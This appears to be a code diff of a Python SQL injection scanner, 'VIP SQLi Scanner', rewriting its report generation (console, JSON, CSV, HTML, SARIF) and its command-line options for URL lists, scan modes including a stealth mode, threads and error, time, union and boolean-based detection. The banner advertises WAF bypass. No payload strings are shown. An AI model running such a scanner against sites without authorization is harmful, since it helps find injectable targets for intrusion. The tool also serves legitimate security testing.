+        stats_table = Table(show_header=False, box=box.SIMPLE)
+        stats_table.add_column(style="cyan")
+        stats_table.add_column(style="white")
         
-        if details:
-            result['vuln_details'] = details
+        stats_table.add_row("Total URLs", str(self.stats.total_urls))
+        stats_table.add_row("Scanned", str(self.stats.scanned_urls))
+        stats_table.add_row("Vulnerable", f"[red]{self.stats.vulnerable_urls}[/red]")
+        stats_table.add_row("Safe", f"[green]{self.stats.safe_urls}[/green]")
+        stats_table.add_row("Errors", f"[yellow]{self.stats.error_count}[/yellow]")
+        stats_table.add_row("Excluded", str(self.stats.excluded_urls))
+        stats_table.add_row("WAF Detected", str(self.stats.waf_detected_count))
+        stats_table.add_row("Elapsed Time", f"{self.stats.elapsed_time():.2f}s")
+        stats_table.add_row("Requests/sec", f"{self.stats.requests_per_second():.2f}")
+        
+        console.print()
+        console.print(Panel(stats_table, title="[bold cyan]Scan Statistics[/bold cyan]", border_style="cyan"))
+        
+        # Detection breakdown
+        if self.stats.vulnerable_urls > 0:
+            detection_table = Table(title="Detection Breakdown", box=box.ROUNDED)
+            detection_table.add_column("Type", style="cyan")
+            detection_table.add_column("Count", justify="right")
             
-    elif verdict == "WARN":
-        result['risk'] = 'Medium'
-        result['cvss_score'] = CVSS_SCORES['MEDIUM']
-        result['cvss_vector'] = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
-        result['remediation'] = REMEDIATION_GUIDE['general']
-        stats.safe += 1
-    elif verdict == "ERROR":
-        result['risk'] = 'Error'
-        result['cvss_score'] = 0.0
-        stats.errors += 1
-    else:
-        result['risk'] = 'Low'
-        result['cvss_score'] = CVSS_SCORES['LOW']
-        stats.safe += 1
-    
-    return result
-
-def scan_urls_threaded(urls, exclusions=[], max_workers=5, enable_time_based=False, 
-                       verbose=False, payloads=None, req_manager=None, resume_state=None):
-    results = resume_state[1] if resume_state else []
-    processed_urls = resume_state[0] if resume_state else set()
-    
-    urls_to_scan = [u for u in urls if u not in processed_urls]
-    
-    with Progress(
-        SpinnerColumn(),
-        TextColumn("[progress.description]{task.description}"),
-        BarColumn(),
-        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-        TimeElapsedColumn(),
-        console=console
-    ) as progress:
-        task = progress.add_task("[cyan]Scanning URLs...", total=len(urls_to_scan))
-        
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            future_to_url = {}
-            for url in urls_to_scan:
-                excluded = False
-                for pattern in exclusions:
-                    if pattern in url:
-                        stats.excluded += 1
-                        excluded = True
-                        break
-                
-                if not excluded:
-                    future = executor.submit(scan_single_url, url, enable_time_based, verbose, payloads, req_manager)
-                    future_to_url[future] = url
-                else:
-                    processed_urls.add(url) # Excluded counts as processed
-                    progress.advance(task)
+            detection_table.add_row("Error-Based", str(self.stats.error_based))
+            detection_table.add_row("Time-Based", str(self.stats.time_based))
+            detection_table.add_row("Union-Based", str(self.stats.union_based))
+            detection_table.add_row("Boolean-Based", str(self.stats.boolean_based))
             
-            completed_count = 0
-            for future in as_completed(future_to_url):
-                url = future_to_url[future]
-                try:
-                    result = future.result()
-                    results.append(result)
-                    processed_urls.add(url)
-                    stats.scanned += 1
-                except Exception as e:
-                    results.append({'url': url, 'verdict': 'ERROR', 'risk': 'Error', 'details': str(e)})
-                    stats.errors += 1
-                    processed_urls.add(url)
-                
-                progress.advance(task)
-                completed_count += 1
-                
-                if completed_count % 50 == 0:
-                    save_state(processed_urls, results)
+            console.print()
+            console.print(detection_table)
         
-        save_state(processed_urls, results)
+        # Database types
+        if self.stats.db_types:
+            console.print()
+            console.print("[bold cyan]Database Types Detected:[/bold cyan]")
+            for db_type, count in self.stats.db_types.items():
+                console.print(f"  • {db_type}: {count}")
+        
+        # WAF types
+        if self.stats.waf_types:
+            console.print()
+            console.print("[bold yellow]WAF Types Detected:[/bold yellow]")
+            for waf_type, count in self.stats.waf_types.items():
+                console.print(f"  • {waf_type}: {count}")
+        
+        # Vulnerabilities
+        if self.results:
+            console.print()
+            vuln_table = Table(title="Vulnerabilities Found", box=box.DOUBLE_EDGE, show_lines=True)
+            vuln_table.add_column("URL", style="cyan", no_wrap=False)
+            vuln_table.add_column("Severity", justify="center")
+            vuln_table.add_column("Type", style="magenta")
+            vuln_table.add_column("Parameter", style="yellow")
+            vuln_table.add_column("CVSS", justify="right")
+            
+            for result in self.results:
+                severity_color = {
+                    VulnerabilityLevel.CRITICAL: "bold red",
+                    VulnerabilityLevel.HIGH: "red",
+                    VulnerabilityLevel.MEDIUM: "yellow",
+                    VulnerabilityLevel.LOW: "blue",
+                }.get(result.severity, "white")
+                
+                vuln_table.add_row(
+                    result.url[:80],
+                    f"[{severity_color}]{result.severity.value}[/{severity_color}]",
+                    result.vulnerability_type,
+                    result.affected_parameter or "N/A",
+                    f"{result.cvss_score:.1f}"
+                )
+            
+            console.print(vuln_table)
     
-    return results
-
-# -------------------------------------------------------------------------
-# EXPORT
-# -------------------------------------------------------------------------
-
-def export_json(results, filename):
-    output = {
-        'scan_info': {
-            'version': VERSION,
-            'timestamp': datetime.now().isoformat(),
-            'total_urls': stats.total,
-            'scanned': stats.scanned,
-            'vulnerable': stats.vulnerable,
-            'safe': stats.safe,
-            'excluded': stats.excluded,
-            'errors': stats.errors,
-            'waf_detected': stats.waf_detected,
-            'elapsed_seconds': int(stats.elapsed()),
-            'requests_per_second': round(stats.requests_per_second(), 2),
-            'databases_detected': stats.db_types_detected,
-            'concurrency': stats.concurrency
-        },
-        'results': results
-    }
-    with open(filename, 'w') as f:
-        json.dump(output, f, indent=2)
-    console.print(f"[green]✓[/green] JSON report saved: {filename}")
-
-def export_csv(results, filename):
-    import csv
-    with open(filename, 'w', newline='', encoding='utf-8') as f:
-        writer = csv.DictWriter(f, fieldnames=['url', 'verdict', 'risk', 'details'])
-        writer.writeheader()
-        for result in results:
-            writer.writerow({
-                'url': result['url'],
-                'verdict': result['verdict'],
-                'risk': result['risk'],
-                'details': result['details']
-            })
-    console.print(f"[green]✓[/green] CSV report saved: {filename}")
-
-def export_html(results, filename):
-    if not JINJA_AVAILABLE:
-        console.print("[yellow]⚠ Jinja2 not installed. Skipping HTML report.[/yellow]")
-        console.print("Run: pip install jinja2")
-        return
-
-    try:
-        env = Environment(
-            loader=FileSystemLoader("templates"),
-            autoescape=select_autoescape(['html', 'xml'])
-        )
-        template = env.get_template("report_template.html")
-        
-        scan_info = {
-            'version': VERSION,
-            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            'total_urls': stats.total,
-            'scanned': stats.scanned,
-            'vulnerable': stats.vulnerable,
-            'safe': stats.safe,
-            'excluded': stats.excluded,
-            'errors': stats.errors,
-            'waf_detected': stats.waf_detected,
-            'elapsed_seconds': int(stats.elapsed()),
-            'requests_per_second': round(stats.requests_per_second(), 2),
-            'databases_detected': stats.db_types_detected,
-            'concurrency': stats.concurrency
+    def generate_json_report(self, filepath: str):
+        """Generate JSON report"""
+        report = {
+            'scan_info': {
+                'version': VERSION,
+                'timestamp': datetime.now().isoformat(),
+                'elapsed_time': self.stats.elapsed_time(),
+            },
+            'statistics': {
+                'total_urls': self.stats.total_urls,
+                'scanned': self.stats.scanned_urls,
+                'vulnerable': self.stats.vulnerable_urls,
+                'safe': self.stats.safe_urls,
+                'errors': self.stats.error_count,
+                'excluded': self.stats.excluded_urls,
+                'waf_detected': self.stats.waf_detected_count,
+                'requests_per_second': self.stats.requests_per_second(),
+                'detection_breakdown': {
+                    'error_based': self.stats.error_based,
+                    'time_based': self.stats.time_based,
+                    'union_based': self.stats.union_based,
+                    'boolean_based': self.stats.boolean_based,
+                },
+                'database_types': dict(self.stats.db_types),
+                'waf_types': dict(self.stats.waf_types),
+            },
+            'vulnerabilities': [result.to_dict() for result in self.results]
         }
         
-        html_content = template.render(results=results, scan_info=scan_info)
+        with open(filepath, 'w') as f:
+            json.dump(report, f, indent=2)
         
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(html_content)
+        console.print(f"[green]✓[/green] JSON report saved: {filepath}")
+    
+    def generate_csv_report(self, filepath: str):
+        """Generate CSV report"""
+        import csv
+        
+        with open(filepath, 'w', newline='', encoding='utf-8') as f:
+            fieldnames = [
+                'url', 'severity', 'confidence', 'vulnerability_type',
+                'affected_parameter', 'payload_used', 'database_type',
+                'waf_detected', 'cvss_score', 'timestamp'
+            ]
+            writer = csv.DictWriter(f, fieldnames=fieldnames)
+            writer.writeheader()
             
-        console.print(f"[green]✓[/green] HTML report saved: {filename}")
+            for result in self.results:
+                writer.writerow({
+                    'url': result.url,
+                    'severity': result.severity.value,
+                    'confidence': result.confidence,
+                    'vulnerability_type': result.vulnerability_type,
+                    'affected_parameter': result.affected_parameter or '',
+                    'payload_used': result.payload_used or '',
+                    'database_type': result.database_type or '',
+                    'waf_detected': result.waf_detected or '',
+                    'cvss_score': result.cvss_score,
+                    'timestamp': result.timestamp,
+                })
         
-    except Exception as e:
-        console.print(f"[red]✗[/red] Error generating HTML report: {e}")
+        console.print(f"[green]✓[/green] CSV report saved: {filepath}")
+    
+    def generate_html_report(self, filepath: str):
+        """Generate HTML report"""
+        html_template = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP SQLi Scanner Report</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
+        .header p { font-size: 1.1em; opacity: 0.9; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 30px;
+            background: #f8f9fa;
+        }
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .stat-card h3 {
+            color: #667eea;
+            font-size: 2em;
+            margin-bottom: 5px;
+        }
+        .stat-card p {
+            color: #666;
+            text-transform: uppercase;
+            font-size: 0.9em;
+            letter-spacing: 1px;
+        }
+        .vulnerabilities {
+            padding: 30px;
+        }
+        .vuln-card {
+            background: white;
+            border-left: 4px solid #dc3545;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .vuln-card.critical { border-color: #dc3545; }
+        .vuln-card.high { border-color: #fd7e14; }
+        .vuln-card.medium { border-color: #ffc107; }
+        .vuln-card.low { border-color: #17a2b8; }
+        .vuln-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .vuln-url {
+            font-weight: bold;
+            color: #667eea;
+            word-break: break-all;
+        }
+        .severity-badge {
+            padding: 5px 15px;
+            border-radius: 20px;
+            color: white;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        .severity-critical { background: #dc3545; }
+        .severity-high { background: #fd7e14; }
+        .severity-medium { background: #ffc107; }
+        .severity-low { background: #17a2b8; }
+        .vuln-details {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .detail-item {
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 5px;
+        }
+        .detail-label {
+            font-weight: bold;
+            color: #667eea;
+            font-size: 0.9em;
+            margin-bottom: 5px;
+        }
+        .detail-value {
+            color: #333;
+        }
+        .footer {
+            background: #2d3748;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛡️ VIP SQLi Scanner Report</h1>
+            <p>Generated: {{timestamp}}</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3>{{total_urls}}</h3>
+                <p>Total URLs</p>
+            </div>
+            <div class="stat-card">
+                <h3>{{scanned}}</h3>
+                <p>Scanned</p>
+            </div>
+            <div class="stat-card">
+                <h3 style="color: #dc3545;">{{vulnerable}}</h3>
+                <p>Vulnerable</p>
+            </div>
+            <div class="stat-card">
+                <h3 style="color: #28a745;">{{safe}}</h3>
+                <p>Safe</p>
+            </div>
+        </div>
+        
+        <div class="vulnerabilities">
+            <h2 style="margin-bottom: 20px; color: #667eea;">🔍 Vulnerabilities Found</h2>
+            {{vulnerabilities_html}}
+        </div>
+        
+        <div class="footer">
+            <p>VIP SQLi Scanner v{{version}} • {{website}}</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+        
+        # Generate vulnerabilities HTML
+        vuln_html = ""
+        for result in self.results:
+            severity_class = result.severity.value.lower()
+            
+            vuln_html += f"""
+            <div class="vuln-card {severity_class}">
+                <div class="vuln-header">
+                    <div class="vuln-url">{result.url}</div>
+                    <div class="severity-badge severity-{severity_class}">{result.severity.value}</div>
+                </div>
+                <div class="vuln-details">
+                    <div class="detail-item">
+                        <div class="detail-label">Type</div>
+                        <div class="detail-value">{result.vulnerability_type}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Parameter</div>
+                        <div class="detail-value">{result.affected_parameter or 'N/A'}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Confidence</div>
+                        <div class="detail-value">{result.confidence * 100:.1f}%</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">CVSS Score</div>
+                        <div class="detail-value">{result.cvss_score}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Database</div>
+                        <div class="detail-value">{result.database_type or 'Unknown'}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">WAF</div>
+                        <div class="detail-value">{result.waf_detected or 'None'}</div>
+                    </div>
+                </div>
+            </div>
+            """
+        
+        # Replace template variables
+        html = html_template
+        html = html.replace('{{timestamp}}', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+        html = html.replace('{{version}}', VERSION)
+        html = html.replace('{{website}}', WEBSITE_URL)
+        html = html.replace('{{total_urls}}', str(self.stats.total_urls))
+        html = html.replace('{{scanned}}', str(self.stats.scanned_urls))
+        html = html.replace('{{vulnerable}}', str(self.stats.vulnerable_urls))
+        html = html.replace('{{safe}}', str(self.stats.safe_urls))
+        html = html.replace('{{vulnerabilities_html}}', vuln_html or '<p>No vulnerabilities found.</p>')
+        
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(html)
+        
+        console.print(f"[green]✓[/green] HTML report saved: {filepath}")
 
-# -------------------------------------------------------------------------
+    def generate_sarif_report(self, filepath: str):
+        """Generate SARIF report"""
+        sarif = {
+            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+            "version": "2.1.0",
+            "runs": [
+                {
+                    "tool": {
+                        "driver": {
+                            "name": "VIP SQLi Scanner",
+                            "version": VERSION,
+                            "informationUri": GITHUB_URL,
+                            "rules": [
+                                {
+                                    "id": "VIP-SQLI-001",
+                                    "name": "SQL Injection",
+                                    "shortDescription": {"text": "SQL Injection vulnerability detected"},
+                                    "helpUri": "https://owasp.org/www-community/attacks/SQL_Injection"
+                                }
+                            ]
+                        }
+                    },
+                    "results": [
+                        {
+                            "ruleId": "VIP-SQLI-001",
+                            "level": "error",
+                            "message": {"text": f"{v.vulnerability_type} detected in parameter '{v.affected_parameter}'"},
+                            "locations": [{"physicalLocation": {"address": {"fullyQualifiedName": v.url}}}],
+                            "properties": {
+                                "severity": v.severity.value,
+                                "confidence": f"{v.confidence * 100:.2f}%",
+                                "payload": v.payload_used
+                            }
+                        } for v in self.results
+                    ]
+                }
+            ]
+        }
+        with open(filepath, 'w', encoding='utf-8') as f:
+            json.dump(sarif, f, indent=2)
+        console.print(f"[green]✓[/green] SARIF report saved: {filepath}")
+
+# =========================================================================
+# BANNER & UI
+# =========================================================================
+
+def print_banner():
+    """Display cyberpunk banner"""
+    banner = Text()
+    banner.append("╔═══════════════════════════════════════════════════════════╗\n", style="bold cyan")
+    banner.append("║  ", style="bold cyan")
+    banner.append("VIP SQLi SCANNER v3.0", style="bold magenta")
+    banner.append("                                 ║\n", style="bold cyan")
+    banner.append("║  ", style="bold cyan")
+    banner.append("Professional SQL Injection Detection Suite", style="cyan")
+    banner.append("            ║\n", style="bold cyan")
+    banner.append("╠═══════════════════════════════════════════════════════════╣\n", style="bold cyan")
+    banner.append("║  ", style="bold cyan")
+    banner.append("🔍 Advanced Detection  🛡️ WAF Bypass  ⚡ High Speed", style="yellow")
+    banner.append("      ║\n", style="bold cyan")
+    banner.append("╚═══════════════════════════════════════════════════════════╝\n", style="bold cyan")
+    banner.append(f"\n[dim]Website: {WEBSITE_URL} | GitHub: {GITHUB_URL}[/dim]\n")
+    
+    console.print(Panel(banner, border_style="magenta", padding=(1, 2)))
+
+# =========================================================================
 # MAIN
-# -------------------------------------------------------------------------
+# =========================================================================
 
 def main():
+    """Main function"""
     print_banner()
     
+    # Argument parser
     parser = argparse.ArgumentParser(
-        description=f"VIP SQLi Scanner - Advanced Edition v{VERSION}",
-        epilog="Created by VIPHacker100"
+        description=f"VIP SQLi Scanner v{VERSION} - Advanced SQL Injection Detection",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s -u "http://example.com/page.php?id=1"
+  %(prog)s -l urls.txt -m deep -t 20
+  %(prog)s -l urls.txt --time-based --json report.json
+  %(prog)s -u "http://example.com/page.php?id=1" --html report.html
+        """
     )
-    parser.add_argument("url_pos", nargs='?', help="Target URL to scan")
-    parser.add_argument("-u", "--url", help="Target URL (alternative to positional)")
-    parser.add_argument("-l", "--list", help="File containing list of URLs")
-    parser.add_argument("-e", "--exclude", help="File containing exclusion patterns")
-    parser.add_argument("-p", "--payloads", default="payloads.txt", help="Payload file")
     
-    # Export options
-    parser.add_argument("-o", "--output", help="Output JSON file")
-    parser.add_argument("--csv", help="Export to CSV file")
-    parser.add_argument("--html", help="Export to HTML report")
+    # Target options
+    target_group = parser.add_mutually_exclusive_group(required=True)
+    target_group.add_argument('-u', '--url', help='Single URL to scan')
+    target_group.add_argument('-l', '--list', help='File containing list of URLs')
     
-    # Performance & Config
-    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
-    parser.add_argument("--async", dest="use_async", action="store_true", help="Use async scanning")
-
-    # v2.2 Arguments
-    parser.add_argument("--ml", action="store_true", help="Enable ML-based detection (beta)")
-    parser.add_argument("--profile", default="balanced", help="Scan profile: aggressive, balanced, stealth")
-    parser.add_argument("--dashboard", action="store_true", help="Launch Real-time Web Dashboard")
-    parser.add_argument("--train", action="store_true", help="Train ML model with available data")
-
-    # v2.2 Phase 5 Arguments
-    parser.add_argument("--pdf", action="store_true", help="Generate PDF report after scan")
-    parser.add_argument("--slack", action="store_true", help="Send results to Slack after scan")
-    parser.add_argument("--s3", action="store_true", help="Upload results to S3 after scan")
-    parser.add_argument("--jira", action="store_true", help="Create Jira issues for critical findings")
-
+    # Scan options
+    parser.add_argument('-m', '--mode', choices=['fast', 'balanced', 'deep', 'stealth'],
+                       default='balanced', help='Scan mode (default: balanced)')
+    parser.add_argument('-t', '--threads', type=int, default=10,
+                       help='Number of threads (default: 10)')
+    parser.add_argument('--timeout', type=int, default=15,
+                       help='Request timeout in seconds (default: 15)')
+    parser.add_argument('--time-based', action='store_true',
+                       help='Enable time-based blind SQLi detection')
+    parser.add_argument('--no-error', action='store_true',
+                       help='Disable error-based detection')
+    parser.add_argument('--no-union', action='store_true',
+                       help='Disable UNION-based detection')
+    parser.add_argument('--boolean', action='store_true',
+                       help='Enable boolean-based detection')
+    parser.add_argument('--ml', action='store_true',
+                       help='Enable ML-based detection scoring')
+    parser.add_argument('--no-plugins', action='store_true',
+                       help='Disable plugin execution')
+    parser.add_argument('--cloud-sync', action='store_true',
+                       help='Enable cloud synchronization')
+    parser.add_argument('-k', '--insecure', action='store_true',
+                       help='Disable SSL certificate verification')
+    
+    # Payloads & exclusions
+    parser.add_argument('-p', '--payloads', help='Custom payload file')
+    parser.add_argument('-e', '--exclude', help='File with exclusion patterns')
+    
+    # Output options
+    parser.add_argument('--json', help='Save JSON report')
+    parser.add_argument('--csv', help='Save CSV report')
+    parser.add_argument('--html', help='Save HTML report')
+    parser.add_argument('--sarif', help='Save SARIF report')
+    
+    # Misc options
+    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
+    
     args = parser.parse_args()
-
-    # Handle v2.2 Commands
-    if args.dashboard:
+    
+    # Disable color if requested
+    if args.no_color:
+        console._color_system = None
+    
+    # Load URLs
+    urls = []
+    if args.url:
+        urls = [args.url]
+    elif args.list:
         try:
-            start_dashboard()
-        except Exception as e:
-            print(f"Failed to start dashboard: {e}")
-        return
-
-    if args.train:
-        from ml.trainer import train_model
-        train_model()
-        return
-
-    # Load Config Profile
-    try:
-        config_loader = ConfigLoader(profile=args.profile)
-        config = config_loader.config
-        
-        # Initialize Globals
-        if args.ml:
-             ml_detector = MLDetector()
-             
-        plugin_manager = PluginManager(config)
-        plugin_manager.load_all_plugins()
-        
-        # Initialize Cloud Manager
-        cloud_manager = CloudManager(config.get('cloud', {}))
-        # Override individual cloud settings via CLI
-        if args.slack: cloud_manager.slack.enabled = True
-        if args.s3: cloud_manager.s3.enabled = True
-        if args.jira: cloud_manager.jira.enabled = True
-
-        # Override args with config if needed
-        if args.profile == 'stealth':
-            args.concurrency = 1
-            args.timeout = 20
-        elif args.profile == 'aggressive':
-            args.concurrency = 20
-            args.timeout = 5
-    except:
-        pass
-    parser.add_argument("--max-concurrent", type=int, default=20, help="Max requests (async)")
-    parser.add_argument("--time-based", action="store_true", help="Enable time-based SQLi")
+            with open(args.list, 'r', encoding='utf-8', errors='ignore') as f:
+                urls = [line.strip() for line in f if line.strip()]
+            console.print(f"[cyan]ℹ[/cyan] Loaded {len(urls)} URLs from {args.list}")
+        except FileNotFoundError:
+            console.print(f"[red]✗[/red] File not found: {args.list}")
+            sys.exit(1)
     
-    # Advanced Options
-    parser.add_argument("--resume", action="store_true", help="Resume previous scan")
-    parser.add_argument("--proxy", help="Single proxy (http://ip:port)")
-    parser.add_argument("--proxy-list", help="File containing list of proxies")
-    parser.add_argument("--headers", help="JSON file with custom headers")
-    parser.add_argument("--filter", action="store_true", help="Organize results into domain folders")
+    if not urls:
+        console.print("[red]✗[/red] No URLs to scan")
+        sys.exit(1)
     
-    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
-    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
-    
-    args = parser.parse_args()
-    
-    # Interactive mode
-    if args.interactive:
-        console.print("[cyan]Interactive Mode[/cyan]\n")
-        args.list = Prompt.ask("URL list file (or press Enter to skip)")
-        if not args.list:
-            args.url = Prompt.ask("Enter single URL")
-        args.threads = int(Prompt.ask("Number of threads", default="5"))
-        args.use_async = Confirm.ask("Use async scanning?", default=False)
-        args.filter = Confirm.ask("Organize results by domain (filter)?", default=False)
-        args.html = Prompt.ask("HTML Report Filename (optional)")
-    
-    # Resolve URL from positional or flag
-    target_url = args.url or args.url_pos
-    
-    if not target_url and not args.list:
-        parser.error("Either provide a URL (positional or -u) or use --list to specify a file")
-    
-    # --- Load Configuration ---
-    
-    # Payloads
-    payloads = load_payloads_from_file(args.payloads)
-    global PAYLOAD_CATEGORIES
-    PAYLOAD_CATEGORIES = payloads
-    
-    # Exclusions
+    # Load exclusions
     exclusions = []
     if args.exclude:
         try:
             with open(args.exclude, 'r', encoding='utf-8', errors='ignore') as f:
-                exclusions = [line.strip() for line in f if line.strip() and not '/#' in line]
+                exclusions = [line.strip() for line in f if line.strip() and not line.startswith('#')]
             console.print(f"[cyan]ℹ[/cyan] Loaded {len(exclusions)} exclusion patterns")
         except FileNotFoundError:
-            console.print(f"[red]✗[/red] Exclusion file not found: {args.exclude}")
-            sys.exit(1)
-            
-    # URLs
-    urls_to_scan = []
-    if args.list:
-        try:
-            with open(args.list, 'r', encoding='utf-8', errors='ignore') as f:
-                urls_to_scan = [line.strip() for line in f if line.strip()]
-            console.print(f"[cyan]ℹ[/cyan] Loaded {len(urls_to_scan)} URLs from list")
-        except FileNotFoundError:
-            console.print(f"[red]✗[/red] URL list file not found: {args.list}")
-            sys.exit(1)
-    else:
-        urls_to_scan = [target_url]
-        
-    stats.total = len(urls_to_scan)
-    stats.concurrency = args.max_concurrent if args.use_async else args.threads
+            console.print(f"[yellow]⚠[/yellow] Exclusion file not found: {args.exclude}")
     
-    # Proxies
-    proxy_list = []
-    if args.proxy_list:
-        try:
-            with open(args.proxy_list, 'r', encoding='utf-8', errors='ignore') as f:
-                proxy_list = [line.strip() for line in f if line.strip()]
-            console.print(f"[cyan]ℹ[/cyan] Loaded {len(proxy_list)} proxies")
-        except:
-            console.print(f"[red]✗[/red] Proxy list not found")
-            sys.exit(1)
-    elif args.proxy:
-        proxy_list = [args.proxy]
-        
-    # Custom Headers
-    custom_headers = {}
-    if args.headers:
-        try:
-            with open(args.headers, 'r', encoding='utf-8', errors='ignore') as f:
-                custom_headers = json.load(f)
-            console.print(f"[cyan]ℹ[/cyan] Loaded custom headers")
-        except:
-            console.print(f"[red]✗[/red] Failed to load headers file")
-            sys.exit(1)
-
-    req_manager = RequestManager(proxy_list, custom_headers)
-
-    # Resume State
-    resume_state = None
-    if args.resume:
-        resume_state = load_state()
-        
-    # --- Execute Scan ---
+    # Initialize components
+    scan_mode = ScanMode(args.mode)
+    config = ScanConfiguration.from_mode(scan_mode)
     
-    console.print(f"\n[bold cyan]Starting scan...[/bold cyan]\n")
+    # Override config with CLI args
+    if args.threads:
+        config.threads = args.threads
+    if args.timeout:
+        config.timeout = args.timeout
+    if args.time_based:
+        config.enable_time_based = True
+    if args.no_error:
+        config.enable_error = False
+    if args.no_union:
+        config.enable_union = False
+    if args.boolean:
+        config.enable_boolean = True
+    if args.ml:
+        config.enable_ml = True
+    if args.no_plugins:
+        config.enable_plugins = False
+    if args.cloud_sync:
+        config.cloud_sync = True
+    if args.insecure:
+        config.verify_ssl = False
+    
+    payload_manager = PayloadManager(args.payloads)
+    url_filter = URLFilter(exclusions)
+    statistics = ScanStatistics(total_urls=len(urls))
+    
+    # Display configuration
+    config_table = Table(show_header=False, box=box.SIMPLE)
+    config_table.add_column(style="cyan")
+    config_table.add_column(style="white")
+    
+    config_table.add_row("Scan Mode", config.mode.value.upper())
+    config_table.add_row("Threads", str(config.threads))
+    config_table.add_row("Timeout", f"{config.timeout}s")
+    config_table.add_row("Payloads", str(payload_manager.total_payloads()))
+    config_table.add_row("Error-Based", "✓" if config.enable_error else "✗")
+    config_table.add_row("Time-Based", "✓" if config.enable_time_based else "✗")
+    config_table.add_row("Union-Based", "✓" if config.enable_union else "✗")
+    config_table.add_row("Boolean-Based", "✓" if config.enable_boolean else "✗")
+    config_table.add_row("ML Scoring", "✓" if config.enable_ml else "✗")
+    config_table.add_row("Plugins", "✓" if config.enable_plugins else "✗")
+    config_table.add_row("Cloud Sync", "✓" if config.cloud_sync else "✗")
+    
+    console.print()
+    console.print(Panel(config_table, title="[bold cyan]Configuration[/bold cyan]", border_style="cyan"))
+    console.print()
+    
+    # Start scan
+    scanner = SQLiScanner(config, payload_manager, url_filter, statistics)
     
     try:
-        if args.use_async:
-            results = asyncio.run(scan_urls_async(
-                urls_to_scan, exclusions, args.max_concurrent, 
-                args.time_based, payloads, args.verbose, req_manager, resume_state
-            ))
-        else:
-            results = scan_urls_threaded(
-                urls_to_scan, exclusions, args.threads, 
-                args.time_based, args.verbose, payloads, req_manager, resume_state
-            )
+        results = scanner.scan_urls(urls)
     except KeyboardInterrupt:
-        console.print("\n[yellow]⚠ Scan interrupted by user. State saved.[/yellow]")
+        console.print("\n[yellow]⚠[/yellow] Scan interrupted by user")
         sys.exit(0)
-        
-    # --- Output ---
     
-    console.print()
-    console.print(create_stats_panel())
-    console.print()
+    # Generate reports
+    report_gen = ReportGenerator(statistics, results)
+    report_gen.generate_console_report()
     
-    if stats.db_types_detected:
-        console.print("[bold cyan]Database Types Detected:[/bold cyan]")
-        for db_type, count in stats.db_types_detected.items():
-            console.print(f"  • {db_type}: {count}")
+    if args.json:
+        report_gen.generate_json_report(args.json)
     
-    # Auto-export filtered results
-    if args.filter:
-        save_filtered_results(results)
-        
-    # Standard Exports
-    if args.output:
-        export_json(results, args.output)
     if args.csv:
-        export_csv(results, args.csv)
+        report_gen.generate_csv_report(args.csv)
+    
     if args.html:
-        export_html(results, args.html)
-
-    # Auto-export separate file (VIP formatting)
-    if results and len(urls_to_scan) > 0:
-        try:
-            target = urls_to_scan[0]
-            parsed = urlparse(target)
-            sitename = parsed.netloc or "target"
-            sitename = sitename.replace(":", "_")
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            
-            # Post-Scan Reporting & Cloud Sync (Phase 5)
-            if args.pdf or config.get('reporting', {}).get('pdf', {}).get('enabled'):
-                pdf_filename = f"VULNERABLE_{sitename}_{timestamp}_vip.pdf"
-                pdf_path = os.path.join(config.get('reporting', {}).get('pdf', {}).get('output_dir', 'reports'), pdf_filename)
-                os.makedirs(os.path.dirname(pdf_path), exist_ok=True)
-                
-                scan_stats = {
-                    'total': stats.total,
